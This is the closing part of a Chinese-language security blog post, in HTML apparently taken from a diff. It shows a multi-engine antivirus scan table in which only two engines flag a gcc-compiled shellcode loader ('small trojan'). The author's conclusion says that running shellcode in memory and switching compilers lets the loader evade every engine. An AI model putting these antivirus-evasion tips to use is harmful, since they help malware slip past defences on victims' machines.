result</span><br><span class="line">ANTIVIR        1.9.2.0        1.9.159.0         7.14.27.224    20   没有发现病毒            </span><br><span class="line">AVAST!         170303-1       4.7.4             2017-03-03     35   没有发现病毒            </span><br><span class="line">AVG            2109/14460     10.0.1405         2017-09-14     1    没有发现病毒            </span><br><span class="line">ArcaVir        1.0            2011              2014-05-30     8    没有发现病毒            </span><br><span class="line">Authentium     4.6.5          5.3.14            2017-09-16     1    没有发现病毒            </span><br><span class="line">Baidu Antivirus2.0.1.0        4.1.3.52192       2.0.1.0        3    没有发现病毒            </span><br><span class="line">Bitdefender    7.58879        7.90123           2015-01-16     1    没有发现病毒            </span><br><span class="line">ClamAV         23835          0.97.5            2017-09-15     1    PUA.Win.Packer.MingwGcc-3     </span><br><span class="line">Comodo         15023          5.1               2017-09-16     3    没有发现病毒            </span><br><span class="line">Dr.Web         5.0.2.3300     5.0.1.1           2017-09-11     50   没有发现病毒            </span><br><span class="line">F-PROT         4.6.2.117      6.5.1.5418        2016-02-05     1    W32/Felix:CO:VC!Eldorado      </span><br><span class="line">F-Secure       2015-08-01-02  9.13              2015-08-01     7    没有发现病毒            </span><br><span class="line">Fortinet                      5.4.247           2017-09-17     1    没有发现病毒            </span><br><span class="line">GData          25.14209       25.14209          2017-09-16     12   没有发现病毒            </span><br><span class="line">IKARUS         3.02.08        V1.32.31.0        2017-09-16     9    没有发现病毒            </span><br><span class="line">NOD32          6086           3.0.21            2017-09-15     1    没有发现病毒            </span><br><span class="line">QQ手机       1.0.0.0        1.0.0.0           2015-12-30     1    没有发现病毒            </span><br><span class="line">Quickheal      14.00          14.00             2017-09-16     3    没有发现病毒            </span><br><span class="line">SOPHOS         5.32           3.65.2            2016-10-10     11   没有发现病毒            </span><br><span class="line">Sunbelt        3.9.2671.2     3.9.2671.2        2017-09-15     2    没有发现病毒            </span><br><span class="line">TheHacker      6.8.0.5        6.8.0.5           2017-09-11     1    没有发现病毒            </span><br><span class="line">Vba32          3.12.29.5 beta 3.12.29.5 beta    2017-09-15     10   没有发现病毒            </span><br><span class="line">ViRobot        2.73           2.73              2015-01-30     1    没有发现病毒            </span><br><span class="line">VirusBuster    15.0.985.0     5.5.2.13          2014-12-05     17   没有发现病毒            </span><br><span class="line">a-squared      9.0.0.4799     9.0.0.4799        2015-03-08     2    没有发现病毒            </span><br><span class="line">nProtect       9.9.9          9.9.9             2013-12-27     3    没有发现病毒            </span><br><span class="line">卡巴斯基   5.5.33         5.5.33            2014-04-01     31   没有发现病毒            </span><br><span class="line">奇虎360      1.0.1          1.0.1             1.0.1          4    没有发现病毒            </span><br><span class="line">安博士V3    9.9.9          9.9.9             2013-05-28     6    没有发现病毒            </span><br><span class="line">安天         AVL SDK 2.0                      1970-01-01     3    没有发现病毒            </span><br><span class="line">江民杀毒   16.0.100       1.0.0.0           2017-09-16     2    没有发现病毒            </span><br><span class="line">熊猫卫士   9.05.01        9.05.01           2017-09-16     5    没有发现病毒            </span><br><span class="line">瑞星         26.28.00.01    26.28.00.01       2016-07-18     4    没有发现病毒            </span><br><span class="line">百度杀毒   1.0            1.0               2017-03-22     1    没有发现病毒            </span><br><span class="line">费尔         17.47.17308    1.0.2.2108        2017-09-16     6    没有发现病毒            </span><br><span class="line">赛门铁克   20151230.005   1.3.0.24          2015-12-30     1    没有发现病毒            </span><br><span class="line">趋势科技   13.302.06      9.500-1005        2017-03-27     1    没有发现病毒            </span><br><span class="line">迈克菲      8620           5400.1158         2017-08-12     17   没有发现病毒            </span><br><span class="line">金山毒霸   2.1            2.1               2017-09-16     3    没有发现病毒</span><br></pre></td></tr></table></figure>
+<p>只有两个杀毒擎报毒，在这里有个问题，小马用的是<code>gcc</code>编译器进行编译，如果我换成其他的编译器的时候，拿去检测，没有一款杀毒引擎报毒，直接免杀全球，所以选择一个合适编译器很重要。</p>
+<h3 id="0x06-结束"><a href="#0x06-结束" class="headerlink" title="0x06 结束"></a>0x06 结束</h3><p>这种以小马的方式执行<code>shellcode</code>在系统中不会产生任何的文件，因为<code>shellcode</code>直接带入内存,所以也减少了被杀的风险，其实在现实中还需要考虑很多问题，比如杀毒软件的内存监控，网络通信监控等等，当我们面对对方杀软无能为力时，这不失为一种有效的方法。</p>
+
+        </div>
+		<!--dashang-->
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/技术/">技术</a>
+            
+        </div>
+        
+    </article>
+    
+    <p>本文内容仅作为作者个人兴趣与观点,若有不恰当之处，望不吝赐教</p>
+    
+    
+</div>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="help" >帮助</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="友情链接">友情链接</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+        </p>
+        <p>
+            Blog by <a href="https://github.com/hucmosin" style="font-weight: bold">Coding Pages</a>
+        </p>
+        
+    </div>
+</footer>
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+<script src="/js/InsightSearch.js"></script>
+<script src="/js/SimpleCore.js"></script>
+
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        SimpleCore.init({
+            buildingTime: '10/20/2017',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            wxMpImg: '/images/weixin-mp.png',
+        });
+    });
+</script>
+</body>
+</html>
